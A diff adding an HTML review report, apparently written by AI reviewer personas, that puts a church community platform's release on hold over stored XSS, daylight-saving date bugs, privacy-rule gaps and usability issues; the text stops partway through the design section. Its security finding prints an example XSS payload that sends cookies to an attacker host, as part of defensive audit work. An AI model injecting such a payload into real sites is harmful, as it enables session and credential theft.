@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Kiwi Church · Council Report · 2026-05-12</title>
+<style>
+  :root {
+    --bg: #0f1115;
+    --bg-soft: #161922;
+    --bg-card: #1c2030;
+    --bg-elevated: #232839;
+    --border: #2a2f43;
+    --border-strong: #3a4259;
+    --text: #e7ebf3;
+    --text-soft: #aab1c2;
+    --text-dim: #7a8298;
+    --accent: #6ee7b7;
+    --accent-soft: #1f3b32;
+    --amber: #f59e0b;
+    --amber-soft: #3a2a09;
+    --red: #ef4444;
+    --red-soft: #401616;
+    --grey: #9ca3af;
+    --grey-soft: #2a2f43;
+    --purple: #a78bfa;
+    --teal: #5eead4;
+    --pink: #f472b6;
+    --indigo: #818cf8;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Inter", "Helvetica Neue", Arial, sans-serif; line-height: 1.55; font-size: 15px; }
+  a { color: var(--teal); }
+  code, pre { font-family: "SFMono-Regular", Consolas, "Liberation Mono", monospace; font-size: 0.9em; }
+  .container { max-width: 1040px; margin: 0 auto; padding: 32px 24px 96px; }
+  header.report-header {
+    background: linear-gradient(140deg, #1e2740 0%, #0f1115 70%);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 32px 28px;
+    margin-bottom: 24px;
+  }
+  header.report-header h1 { margin: 0 0 6px; font-size: 28px; letter-spacing: -0.01em; }
+  header.report-header .meta { color: var(--text-dim); font-size: 13px; }
+  header.report-header .faction-strip { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 16px; }
+  .faction-chip { display: inline-flex; align-items: center; gap: 4px; padding: 3px 10px; border-radius: 999px; background: var(--bg-elevated); color: var(--text-soft); font-size: 12px; border: 1px solid var(--border); }
+  .toolbar { display: flex; gap: 8px; margin-top: 16px; }
+  .toolbar button { background: var(--bg-elevated); color: var(--text); border: 1px solid var(--border); padding: 6px 12px; border-radius: 6px; font-size: 12px; cursor: pointer; }
+  .toolbar button:hover { border-color: var(--border-strong); }
+  /* Verdict banner */
+  .verdict {
+    border-radius: 12px;
+    padding: 22px 26px;
+    margin-bottom: 24px;
+    border: 1px solid var(--border-strong);
+    background: var(--bg-card);
+  }
+  .verdict.hold { border-color: #5d2929; background: linear-gradient(95deg, #2a1414, #1a1a22); }
+  .verdict.amber { border-color: #5b4218; background: linear-gradient(95deg, #2b1f0a, #1a1a22); }
+  .verdict.ship { border-color: #1f5d3a; background: linear-gradient(95deg, #102b1e, #131820); }
+  .verdict h2 { margin: 0 0 6px; font-size: 22px; letter-spacing: -0.01em; }
+  .verdict .label { display: inline-block; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 12px; }
+  .verdict.hold .label { background: var(--red); color: #fff; }
+  .verdict.amber .label { background: var(--amber); color: #000; }
+  .verdict.ship .label { background: var(--accent); color: #000; }
+  /* Sections */
+  section.block {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 22px 26px;
+    margin-bottom: 22px;
+  }
+  section.block h2 { margin: 0 0 12px; font-size: 18px; letter-spacing: -0.01em; }
+  /* Critical path */
+  .critical-path { list-style: none; padding: 0; margin: 0; counter-reset: cp; }
+  .critical-path li { padding: 12px 14px 12px 48px; position: relative; border-radius: 8px; background: var(--bg-soft); border: 1px solid var(--border); margin-bottom: 8px; counter-increment: cp; }
+  .critical-path li::before { content: counter(cp); position: absolute; left: 12px; top: 12px; width: 26px; height: 26px; border-radius: 50%; background: var(--red); color: #fff; font-weight: 700; font-size: 13px; display: flex; align-items: center; justify-content: center; }
+  .critical-path li .who { display: block; color: var(--text-dim); font-size: 12px; margin-top: 2px; }
+  /* Faction card */
+  .faction-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 18px;
+  }
+  .faction-card .faction-head { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; margin-bottom: 14px; }
+  .faction-card .faction-name { display: inline-flex; align-items: center; gap: 8px; font-size: 17px; font-weight: 600; }
+  .severity-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+  .severity-dot.red { background: var(--red); box-shadow: 0 0 0 4px var(--red-soft); }
+  .severity-dot.amber { background: var(--amber); box-shadow: 0 0 0 4px var(--amber-soft); }
+  .severity-dot.green { background: var(--accent); box-shadow: 0 0 0 4px var(--accent-soft); }
+  .faction-card h3 { margin: 14px 0 6px; font-size: 14px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-dim); }
+  .recos { list-style: none; padding: 0; margin: 0 0 12px; }
+  .recos li { padding: 10px 12px; background: var(--bg-soft); border-left: 3px solid var(--grey); border-radius: 0 6px 6px 0; margin-bottom: 6px; display: flex; gap: 10px; align-items: baseline; }
+  .recos li.critical { border-color: var(--red); }
+  .recos li.important { border-color: var(--amber); }
+  .recos li.nice { border-color: var(--grey); }
+  .tag { font-size: 10px; padding: 2px 7px; border-radius: 3px; font-weight: 700; letter-spacing: 0.06em; text-transform: uppercase; flex-shrink: 0; }
+  .tag.critical { background: var(--red); color: #fff; }
+  .tag.important { background: var(--amber); color: #000; }
+  .tag.nice { background: var(--grey); color: #000; }
+  .synthesis { background: var(--bg-soft); padding: 12px 14px; border-radius: 8px; color: var(--text-soft); font-size: 14px; border: 1px solid var(--border); }
+  /* Members within faction */
+  details.member { margin-top: 12px; border: 1px solid var(--border); border-radius: 8px; background: var(--bg-soft); padding: 12px 14px; border-left: 4px solid var(--indigo); }
+  details.member.c1 { border-left-color: #10b981; }
+  details.member.c2 { border-left-color: #ef4444; }
+  details.member.c3 { border-left-color: #a855f7; }
+  details.member.c4 { border-left-color: #06b6d4; }
+  details.member.c5 { border-left-color: #f59e0b; }
+  details.member.c6 { border-left-color: #818cf8; }
+  details.member.c7 { border-left-color: #ec4899; }
+  details.member.c8 { border-left-color: #14b8a6; }
+  details.member > summary { cursor: pointer; list-style: none; outline: none; }
+  details.member > summary::-webkit-details-marker { display: none; }
+  details.member .m-head { display: flex; align-items: center; gap: 10px; font-size: 14px; }
+  details.member .m-avatar { font-size: 22px; line-height: 1; }
+  details.member .m-name { font-weight: 600; }
+  details.member .m-role { color: var(--text-dim); font-size: 12px; }
+  details.member .chevron { margin-left: auto; color: var(--text-dim); font-size: 11px; }
+  details.member[open] .chevron::after { content: "Collapse"; }
+  details.member:not([open]) .chevron::after { content: "Expand"; }
+  details.member .compact { margin-top: 10px; padding-top: 10px; border-top: 1px dashed var(--border); color: var(--text-soft); }
+  details.member .full { margin-top: 10px; }
+  details.member .full p { margin: 0 0 10px; }
+  details.member .full strong { color: var(--text); }
+  details.member .anchor-ref { font-style: italic; color: var(--text-dim); margin-top: 8px; padding: 10px 12px; background: var(--bg-elevated); border-radius: 6px; }
+  /* Token table */
+  table.tokens { width: 100%; border-collapse: collapse; font-size: 12px; color: var(--text-dim); }
+  table.tokens th, table.tokens td { text-align: left; padding: 6px 8px; border-bottom: 1px solid var(--border); }
+  table.tokens th { color: var(--text-soft); font-weight: 600; }
+  table.tokens tr.total { font-weight: 700; color: var(--text); background: var(--bg-soft); }
+  /* Misc */
+  .blind-spot { padding: 12px 14px; background: var(--amber-soft); border-left: 4px solid var(--amber); border-radius: 0 6px 6px 0; margin-bottom: 8px; color: #f6e3b0; }
+  pre.quote { background: var(--bg-elevated); padding: 10px 12px; border-radius: 6px; white-space: pre-wrap; font-size: 13px; color: var(--text-soft); }
+  hr { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
+  .footer-note { text-align: center; color: var(--text-dim); font-size: 12px; margin-top: 32px; }
+</style>
+</head>
+<body>
+<div class="container">
+
+<header class="report-header">
+  <div style="font-size: 26px; display:inline-block; margin-bottom: 6px;">👑</div>
+  <h1>Kiwi Church Community Platform — Council Verdict</h1>
+  <div class="meta">2026-05-12 · 20 council members · 11 factions · run after autopilot session, before deploy</div>
+  <div class="faction-strip">
+    <span class="faction-chip">💻 Code (3)</span>
+    <span class="faction-chip">🎨 Design (2)</span>
+    <span class="faction-chip">✍️ Content (3)</span>
+    <span class="faction-chip">💼 Business (1)</span>
+    <span class="faction-chip">👥 User (4)</span>
+    <span class="faction-chip">🔨 Stress Test (1)</span>
+    <span class="faction-chip">🔧 Ops (1)</span>
+    <span class="faction-chip">🎭 Creative (1)</span>
+    <span class="faction-chip">🎪 Circus (2)</span>
+    <span class="faction-chip">⭐ Icons (1)</span>
+    <span class="faction-chip">⚔️ Jedi (1)</span>
+  </div>
+  <div class="toolbar">
+    <button onclick="document.querySelectorAll('details.member').forEach(d => d.open = true);">Expand all</button>
+    <button onclick="document.querySelectorAll('details.member').forEach(d => d.open = false);">Collapse all</button>
+  </div>
+</header>
+
+<div class="verdict hold">
+  <div class="label">Hold</div>
+  <h2>Do not deploy the autopilot session as-is.</h2>
+  <p>The autopilot session shipped five interlocking features cleanly at the type-check level, but the council has surfaced three deploy-blocker bugs (stored XSS on the static Kete render, DST drift in the recurrence date math, raw user IDs rendered as attendee names) and a privacy model that the Firestore rules don’t enforce. Fix the deploy-blockers, gate registration before a stranger becomes an authenticated insider, and run two manual passes with real members before pushing live.</p>
+  <p style="color:var(--text-dim); font-size: 13px; margin-bottom:0;">Beyond the blockers, the platform is loved and competently engineered. The gap is between “code is correct” and “the church it serves can actually use it” — and the council found that gap is wider than the autopilot summary suggested.</p>
+</div>
+
+<section class="block">
+  <h2>🚨 Critical Path — if you only have a few hours, do these</h2>
+  <p style="color:var(--text-dim); margin-top:0;">One ranked action from each active faction, hardest-hitting first.</p>
+  <ol class="critical-path">
+    <li>
+      <strong>Patch the stored XSS on the static Kete render.</strong>
+      <span class="who">💻 Code · Sentinel · post.html / kete.html innerHTML interpolation has no DOMPurify on the static side</span>
+    </li>
+    <li>
+      <strong>Lock open self-registration before stranger = authenticated insider.</strong>
+      <span class="who">🔨 Stress Test · Social Engineer · auto-‘member’ role + leaked admin emails = phishing playbook</span>
+    </li>
+    <li>
+      <strong>Fix DST drift in recurrence date math; use setDate(+7) on a fresh clone.</strong>
+      <span class="who">💼 Business · The Contrarian · weekly/fortnightly series spanning Sep/Apr DST land on the wrong day</span>
+    </li>
+    <li>
+      <strong>Show real names in the attendee list (not Firestore user IDs).</strong>
+      <span class="who">⭐ Icons / 👥 User · multiple voices · family RSVP shipped on top of a broken list</span>
+    </li>
+    <li>
+      <strong>Enforce privacy at the Firestore rule, not in React.</strong>
+      <span class="who">💻 Code · Sentinel · `allow read: if isAuthenticated()` returns full user doc regardless of toggles</span>
+    </li>
+    <li>
+      <strong>Put a phone number on the public homepage and footer in big type.</strong>
+      <span class="who">👥 User · Grandma · no phone number anywhere; older visitors give up and ring Marjorie</span>
+    </li>
+    <li>
+      <strong>Cut profile’s 7 privacy toggles to one simple choice with “advanced” underneath.</strong>
+      <span class="who">🎭 Creative / 👥 User · Steve Jobs + Rachel · seven decisions to make a profile is cowardice and overwhelm</span>
+    </li>
+    <li>
+      <strong>Rewrite hero with specifics; kill “Learn More”; add a “first visit” explainer.</strong>
+      <span class="who">✍️ Content · Copywriter + Editor + Storyteller · “Welcome to the Table” is poetry without proof</span>
+    </li>
+    <li>
+      <strong>Replace 60-event RSVP fanout with a denormalised yesCount on the event doc.</strong>
+      <span class="who">💻 Code · Speed Freak · getCountFromServer × 60 = 60 paid reads per Hosting tab switch</span>
+    </li>
+    <li>
+      <strong>Fix tab keyboard contract + add accessible names to toggles.</strong>
+      <span class="who">🎨 Design · The Advocate · PrivacySection switches read as unnamed checkboxes to screen readers</span>
+    </li>
+    <li>
+      <strong>Tokenise the four hardcoded card hexes; switch role pill to rounded-full to match Badge.</strong>
+      <span class="who">🎨 Design · Pixel Perfectionist · #faf8f4/#e0dbd2/#ebe6dc/#f0ece4 repeat 75× across 26 files</span>
+    </li>
+    <li>
+      <strong>Pause new features for three sessions; watch three members use it; close two open bugs.</strong>
+      <span class="who">⚔️ Jedi · Yoda · the platform’s pace has outrun the church it serves</span>
+    </li>
+    <li>
+      <strong>Transfer GitHub repo off Joel’s personal account; add a 2nd Firebase project owner; write a README.</strong>
+      <span class="who">🔧 Ops · Bus Factor · today the bus factor is 1 and there is no recovery path</span>
+    </li>
+  </ol>
+</section>
+
+<section class="block">
+  <h2>🟡 Cross-Faction Blind Spots</h2>
+  <div class="blind-spot"><strong>No one tested it on a real church member’s phone.</strong> Sentinel found XSS, Contrarian found DST, Advocate found a11y gaps, Grandma couldn’t find the phone number — but every voice independently said the autopilot shipped without a single manual run-through. Type-check is not testing.</div>
+  <div class="blind-spot"><strong>The platform’s feature pace contradicts the platform’s design intention.</strong> DESIGN.md says “unhurried, magazine pacing, like being invited into a living room.” The session log says five features in a day. Yoda and First Principles Thinker both flagged this independently. The product is fighting its own brief.</div>
+  <div class="blind-spot"><strong>The privacy model is a promise the platform cannot keep.</strong> Sentinel: rules let any member read every user doc. Contrarian: defaults leak email/phone. Jesus: family list is all-or-nothing, exposing children’s names. Social Engineer: open registration means any attacker becomes an authenticated reader. None of these voices spoke to each other; they all landed on the same wound.</div>
+  <div class="blind-spot"><strong>The static site and the portal are two different products with one repo and no shared mental model.</strong> Junior Dev couldn’t tell which HTML to open. Sentinel found XSS only on the static side because DOMPurify lives only in the portal. The Storyteller noticed the homepage hero promises a journey the public event modal can’t deliver. One repo, two surfaces, no bridge.</div>
+  <div class="blind-spot"><strong>No one in the autopilot loop represents the older user.</strong> Grandma can’t find a phone number. The 5-Year-Old asks why “Kete” and “Thin Place” aren’t explained. Rachel says “dependants” reads like a tax form. The platform speaks insider language to an audience that includes strangers and 78-year-olds.</div>
+</section>
+
+<!-- FACTION CARDS -->
+
+<!-- 💻 CODE COUNCIL -->
+<div class="faction-card">
+  <div class="faction-head">
+    <span class="faction-name">💻 Code Council <span class="severity-dot red" title="Critical"></span></span>
+    <span style="color:var(--text-dim); font-size:12px;">3 members</span>
+  </div>
+
+  <h3>Top Recommendations</h3>
+  <ul class="recos">
+    <li class="critical"><span class="tag critical">Critical</span><span>Patch stored XSS on the static Kete render (post.html / kete.html innerHTML with no DOMPurify) — bundle DOMPurify into js/main.js, reuse the portal’s iframe-host allowlist.</span></li>
+    <li class="critical"><span class="tag critical">Critical</span><span>Fix DST drift in recurrence math by incrementing via `setDate(d.getDate() + 7)` on a fresh clone instead of millisecond arithmetic.</span></li>
+    <li class="critical"><span class="tag critical">Critical</span><span>Show real display names (not Firestore user IDs) in the EventModal “Who’s going” list — fetch user docs or denormalise displayName onto RSVPs.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Enforce privacy in Firestore rules: split sensitive fields into /users/{id}/private subdoc or scrub via Cloud Function read proxy. React toggles are theatre right now.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Replace the Hosting per-event `getCountFromServer` fanout with a denormalised `rsvpYesCount` on the event doc, updated by a transaction on RSVP change.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Add `manualChunks` to split `firebase/firestore` and `firebase/storage` out of the 1064 kB main bundle so /login doesn’t pay for Firestore.</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>Test whether `/dist/js/portal.js` (561 kB) is reachable at all; if not, remove the static-copy target.</span></li>
+  </ul>
+
+  <h3>Synthesis</h3>
+  <div class="synthesis">The code is shipping faster than the safety net can catch. First Principles Thinker challenges whether half these features should exist at all. The Sentinel found a stored-XSS path on the public Kete render that has been live for weeks. The Speed Freak measured a 1 MB main bundle that loads Firestore on the login page. Across all three voices: this codebase is competent and growing too fast for its own QA discipline. Slow down, denormalise the counts, sanitize the static side, and decide which features actually deserve to exist before adding the next one.</div>
+
+  <details class="member c1">
+    <summary><div class="m-head"><span class="m-avatar">🛡️</span><span class="m-name">The Sentinel</span><span class="m-role">Security Hardliner</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> The static public website renders Kete post HTML through `innerHTML` with zero sanitization. Any authenticated `canPostKete` user can ship arbitrary script/iframe/event-handler markup straight onto `kete.html`, `post.html`, and the homepage, where it executes under the production origin. The portal’s DOMPurify wrapper does not exist on the static site. Secondary finding: profile privacy toggles are enforced only in React, not in Firestore rules, so PII leaks to any authenticated member.</div>
+    <div class="full">
+      <p><strong>Vuln-001: Stored XSS on the public static site (CRITICAL).</strong> `post.html:400`, `post.html:505`, and `kete.html:433` all do `container.innerHTML = ... ${post.content} ...` directly. Grep DOMPurify in *.html and js/* returned zero hits. The portal sanitizes (`KetePostPage.tsx:177`); the static site does not. An author can publish a post containing <code>&lt;img src=x onerror=fetch('https://attacker/'+document.cookie)&gt;</code> or a javascript: iframe and it executes on `kiwichurch-1ef0f.web.app/post.html?id=…`. Same-origin reach means an attacker can pull Firebase ID tokens out of IndexedDB, hit Firestore as the victim, post DMs, exfiltrate the directory. Required fix: bundle DOMPurify into `js/main.js`, sanitize with the iframe-host allowlist from `KetePostPage.tsx:10-28`, never interpolate `post.title`, `post.excerpt`, `post.authorName`, `att.url`, `att.name` raw.</p>
+      <p><strong>Vuln-002: Privacy toggles are client-side decoration (HIGH).</strong> `firestore.rules:74` is `allow read: if isAuthenticated()` for `/users/{userId}`. `MemberDetailModal.tsx:43-49` decides what to show based on the privacy map. Any authenticated member can `getDoc(doc(db,'users',targetId))` from the JS console and receive the full document — phone, email, dependants[], gallery[], bio. The toggles are theatre. Split sensitive fields into `/users/{id}/private/contact` with a rule that reads the target’s privacy map.</p>
+      <p><strong>Vuln-003: Storage delete on user galleries (MEDIUM).</strong> `storage.rules:51-62` allows `delete: if isAuthenticated() && request.auth.uid == userId` for gallery, but the broader storage policy sets `allow delete: if false` everywhere else. Asymmetric authority. Pick one model.</p>
+      <p><strong>Vuln-004: Group resource delete authority too wide (MEDIUM).</strong> `storage.rules:121` is `allow delete: if isAuthenticated()`. Any authenticated user can delete any group resource file from any gathering’s library. Firestore rule restricts the metadata to uploader/admin/host — file vanishes, metadata remains. DoS path for any logged-in member against every group’s shared files.</p>
+      <p><strong>Vuln-005: `userProfiles` mirror has no role/active checks (LOW).</strong> `firestore.rules:104-107` lets any user write to their own `userProfiles/{userId}` doc with no field allowlist and no `isActive()` guard. Tighten the allowed-keys diff or remove this collection if it’s dead code.</p>
+      <p><strong>Vuln-006: Notification flood vector (LOW-MEDIUM).</strong> `firestore.rules:299-313` lets any active authenticated user create unlimited notifications for any other user. No rate limit, no validation that `userId` actually corresponds to a related event. Anyone can spam any member’s notification panel and trigger Web Notifications API browser pop-ups. Add App Check + ReCAPTCHA Enterprise before launch.</p>
+    </div>
+  </details>
+
+  <details class="member c2">
+    <summary><div class="m-head"><span class="m-avatar">🔥</span><span class="m-name">The Contrarian</span><span class="m-role">Devil’s Advocate</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> Five features in one autopilot shipped without manual QA, on a platform serving older adults who will not file bug reports — they will quietly stop using it. The recurring-event date math is built on millisecond arithmetic across local-time midnights, which means any series spanning NZ daylight saving will drift by an hour and start landing on the wrong day. The attendee list shows raw Firestore user IDs instead of names, the privacy model defaults to leaking email and phone to every authenticated member, and there is no test in the repo verifying any of it.</div>
+    <div class="full">
+      <p>The recurrence generator is the headline crack. `parseISODate` builds a `Date` at local midnight, then weekly and fortnightly advance with `i * 7 * DAY_MS`. NZ shifts between NZST and NZDT at 2am on the last Sunday of September and first Sunday of April. A weekly service started in mid-September that runs to October will, on the DST week, land on a Date whose hour is 23:00 the previous day. `toISODate` then reads `getDate()` from that drifted Date and writes the wrong YYYY-MM-DD. Six-event series, third event lands on Saturday instead of Sunday. Nobody catches it until grandma drives to an empty hall. `monthly` uses `setMonth` so it dodges this. Fix is trivial — increment via `setDate(d.getDate() + 7)` on a fresh clone — but it has to actually be fixed.</p>
+      <p>The attendee list in EventModal renders `selfLabel = isSelf ? 'You' : rsvp.userId`. That’s the Firestore document ID, a 28-character hash. Same with `Avatar size="sm" name={rsvp.userId}` — the avatar initials are computed from `Tk9p3rXYz…`. The “who’s going” list is unusable for anyone who isn’t themselves. This isn’t new this session but the family RSVP feature shipped on top of it.</p>
+      <p>`DEFAULT_PRIVACY` defaults `showEmail` and `showPhone` to true. Every existing user — every member who registered before this session — has no `privacy` field on their doc, so the spread resolves both to true. The directory modal now exposes email and phone for every member to every other authenticated member by default. Church members did not consent to a directory the day they signed up. Needs a migration script or a banner forcing the choice on next login.</p>
+      <p>`updateEventSeries` happily strips `date` and `recurrenceIndex` from updates and propagates everything else including `gatheringId`. If a host renames the series and changes the group, every future event jumps groups silently — including events members have already RSVP’d to. No audit trail, no notification, no “this will affect 47 RSVPs” warning.</p>
+      <p>The whole batch shipped with `npm run typecheck` as the only verification gate. Typecheck does not catch DST, does not catch userId-instead-of-name, does not catch privacy defaults that violate the audience’s expectations. There are no tests in this repo — never were — and autopilot just shipped 1,103 lines across five interlocking features. Do not deploy. Run through the recurrence path on a calendar that crosses 27 September 2026, click every attendee list, log in as a non-admin and check what you can see about other members. Then deploy.</p>
+    </div>
+  </details>
+
+  <details class="member c3">
+    <summary><div class="m-head"><span class="m-avatar">🏎️</span><span class="m-name">The Speed Freak</span><span class="m-role">Performance Engineer</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> The 1064 kB main bundle (281 kB gz) is the bottleneck. Firebase Firestore + WebChannel transport loads on every route including `/login`, when only Auth is needed there. Hero JPGs in `/Images/` ship 880 kB of uncompressed photography to the homepage. HostingPage fires up to 60 sequential `getCountFromServer` round-trips. `MemberDetailModal` parallel-fans `getDoc` across every gathering the org has. No `manualChunks`, no `react-router-dom` vendor split, no image preprocessing in the Vite pipeline.</div>
+    <div class="full">
+      <p><strong>Bundle: 1064 kB / 281 kB gz in `index-BH1Fis6j.js`.</strong> Firestore alone is ~600-700 kB (109 firestore string references, full WebChannel transport, persistentLocalCache plus IndexedDB shim). React, react-router, react-hook-form, zod, zustand, TanStack Query, lucide-react, clsx, tailwind-merge, dompurify all ride along. Quill is correctly split (212 kB / 54 kB gz). `dist/js/portal.js` weighs 561 kB raw — dead bundle if `portal.html` is no longer linked. There is no `manualChunks` in vite.config.ts: Firestore should be its own vendor chunk loaded on-demand after login. Estimated 40-50% TTI cut on first paint.</p>
+      <p><strong>Images: 880 kB of unoptimised JPG ships with every homepage hit.</strong> `HansonsLaneOpening-2131a.jpg` is 536,455 bytes; `…2139.jpg` is 348,692 bytes. AVIF at q60 lands these in 60-120 kB. No `&lt;picture&gt;` with srcset, no `loading="lazy"`, no width/height to prevent CLS. `KiwiChurch_Old_White_Shadow.png` at 223 kB should be SVG (or AVIF &lt;10 kB).</p>
+      <p><strong>Queries: HostingPage and MemberDetailModal are N+1 read amplifiers.</strong> `getEventGoingCounts` iterates eventIds and awaits each `getCountFromServer` in `Promise.all` — up to 60 parallel aggregation requests on tab switch, each billed as one read. `getUserGatheringIds` fans `getDoc(doc('gatherings', id, 'members', userId))` across every gathering — 20 gatherings = 20 reads per modal open. Single `collectionGroup('members')` query replaces it with 1 read.</p>
+      <p><strong>Render: 86 kB CSS / 16 kB gz, four real-time `onSnapshot` subscriptions wire up on AppLayout mount.</strong> PWA precaches 33 entries / 1700 KiB — `globPatterns: ['assets/**/*.{js,css}', …]` pulls every lazy route chunk into the precache, defeating the purpose of `React.lazy`. Switch lazy-page chunks to runtime caching (StaleWhileRevalidate); only precache the shell.</p>
+      <p><strong>Ranked fixes by impact-per-effort:</strong> 1) `manualChunks` for `firebase/firestore` + `firebase/storage`. Target: &lt;400 kB raw. 2) AVIF + responsive srcset on hero JPGs. Target: 880 kB → 120 kB. 3) Denormalise `rsvpYesCount` onto event docs. 4) Replace `getUserGatheringIds` parallel `getDoc` with `collectionGroup` query. 5) Fix PWA precache globs. 6) Delete `dist/js/portal.js` if portal.html is unused. 7) Generate gallery thumbnails on upload. 8) Audit Tailwind content globs.</p>
+    </div>
+  </details>
+
+  <details class="member c4">
+    <summary><div class="m-head"><span class="m-avatar">🧬</span><span class="m-name">First Principles Thinker</span><span class="m-role">Problem Reframer</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> The platform is built on an unexamined assumption: that a church community needs a software product. Before shipping more features, the team should test whether engagement is bottlenecked by missing functionality or by something the software can’t fix (relational depth, leadership rhythms, a clear reason to log in on a Tuesday). Audit which features are actually used after 90 days; the answer probably reveals you’ve been optimising the wrong variable.</div>
+    <div class="full">
+      <p>What problem is this actually solving? I’ve read CLAUDE.md three times and I still don’t know. There’s a member portal, a static site, a directory, a blog, polls, reactions, DMs, family RSVPs, recurring events, moderation queues, a Kete editor overhaul. Each one is built well. But what is the job-to-be-done? When a member at Hansons Lane wakes up on a Wednesday morning, what makes them open this app instead of texting Darryl or Julie?</p>
+      <p>Here’s the question I’d ask before writing another line of code. If you turned off the portal for thirty days and told the congregation to use group texts, a shared Google Calendar, and a printed directory, what would actually break? Not what would be inconvenient. What would break. The features that survive that question are the product.</p>
+      <p>Notice what the codebase is implicitly assuming. That members want a feed. That they want to discover events by browsing. That they want to message each other inside the church app rather than in WhatsApp where their family already is. The brief said “polls and surveys”, so polls got built. The brief said “file sharing”, so a resources library got built. The brief was written by someone who was also guessing. You’re building features-to-spec on a spec that nobody validated.</p>
+      <p>The Kete editor overhaul is the tell. Eighteen commits, a per-user permission flag, pre-allocated Firestore IDs, DOMPurify hook deduplication for HMR. Exquisite engineering. But how many Kete posts will exist in twelve months? Twenty? Two hundred? If it’s twenty, the right answer was probably a Google Doc with a shared folder, and the editor work was a beautifully executed answer to a question the church wasn’t asking.</p>
+      <p>Pick five members across the age range. Sit with them. Watch them try to do one thing in the portal without prompting. Then ask the leadership: what is the one behaviour change you’d pay for? Connection between Sundays? Faster event signup? New-member onboarding? Whatever the answer is, that becomes the product, and the rest gets ruthlessly hidden until it earns its way back in.</p>
+    </div>
+  </details>
+</div>
+
+<!-- 🎨 DESIGN COUNCIL -->
+<div class="faction-card">
+  <div class="faction-head">
+    <span class="faction-name">🎨 Design Council <span class="severity-dot amber"></span></span>
+    <span style="color:var(--text-dim); font-size:12px;">2 members</span>
+  </div>
+  <h3>Top Recommendations</h3>
+  <ul class="recos">
+    <li class="critical"><span class="tag critical">Critical</span><span>Privacy toggles in PrivacySection have no accessible name and don’t announce as switches (WCAG 1.3.1, 4.1.2). Wrap label text inside &lt;label&gt; or add `role="switch"` + `aria-checked`.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>HostingPage tabs declare `role="tablist"` but break the WAI-ARIA keyboard contract: no arrow-key focus, no `aria-controls`, no roving tabindex. Same with role/group filter pills using bare buttons.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>EventModal “Who’s going” disclosure has `aria-expanded` but no accessible name; attendee list falls back to raw userId. Both fail 1.3.1.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Tokenise the repeated card hex pair `bg-[#faf8f4] border-[#e0dbd2]` — 75 instances across 26 files. The tokens already exist in app.css.</span></li>
+    <li class="important"><span class="tag important">Important</span><span>Profile page is 5 stacked sections with 7 terracotta eyebrows in a row. Either group sections into two cards or vary treatment (one card, one serif h2, one eyebrow).</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>Gallery image alt defaults to “Gallery image”. With 6 images this reads as “image image image image” in a screen reader. Use empty alt or prompt for description on upload.</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>32 px icon-button targets in FamilySection are below WCAG 2.5.8 minimum (24×24 AA, 44×44 AAA).</span></li>
+    <li class="nice"><span class="tag nice">Nice</span><span>Move focus into the dialog on open and back to trigger on close in `Modal.tsx` (currently only sets tabIndex=-1).</span></li>
+  </ul>
+  <h3>Synthesis</h3>
+  <div class="synthesis">The new components rhyme with the established portal pattern — ivory card, terracotta eyebrow, no shadows — which is a real win. The cracks are tokenisation drift (75 hardcoded hexes), an accidental cool-gray track in a warm palette, and a profile page that now repeats the same section treatment 5 times in a row. Accessibility is mostly good but has three load-bearing failures: unnamed switches, broken tab keyboard contract, and userIds rendered as names.</div>
+
+  <details class="member c5">
+    <summary><div class="m-head"><span class="m-avatar">🎨</span><span class="m-name">The Pixel Perfectionist</span><span class="m-role">Design Critic</span><span class="chevron"></span></div></summary>
+    <div class="compact"><strong>Compact take.</strong> New surfaces rhyme with the portal’s “ivory card on parchment, no shadows, terracotta eyebrow label” pattern — a real win. The cracks are typographic and tokenisation drift: hardcoded hexes (`#faf8f4`, `#e0dbd2`, `#ebe6dc`, `#f0ece4`) repeat 75 times across 26 files; the directory’s role pill goes square (`rounded-sm`) while every other badge is `rounded-full`; the privacy toggle leaks a cool `bg-gray-200` track into a palette that bans cool grays. The new Profile page stretches past 1500 px tall with five stacked terracotta eyebrows.</div>
+    <div class="full">
+      <p>The terracotta eyebrow label, Source Sans 3 12px, weight 500, tracking-widest, 12 px bottom margin, is now repeated on `ProfilePage.tsx` lines 152, 161, 173 and then four more times inside FamilySection (88), InterestsSection (63), GallerySection (66), PrivacySection (32) and MemberDetailModal ×6. Seven identical eyebrows on one scroll is wallpaper. Group these into two visible sections or vary the treatment.</p>
+      <p>The card surface is the most repeated visual element on the new surfaces and it is <strong>not tokenised</strong>. Every new component literally writes `bg-[#faf8f4] border border-[#e0dbd2] rounded-lg` — FamilySection:95,100, InterestsSection:64, PrivacySection:33, GallerySection:87, DirectoryPage:91,155,158. The directory letter header at DirectoryPage:158 uses `bg-[#f0ece4]` (Warm Sand), which doesn’t match the `--color-cream-dark: #f0ebe3` token in `app.css:11`.</p>
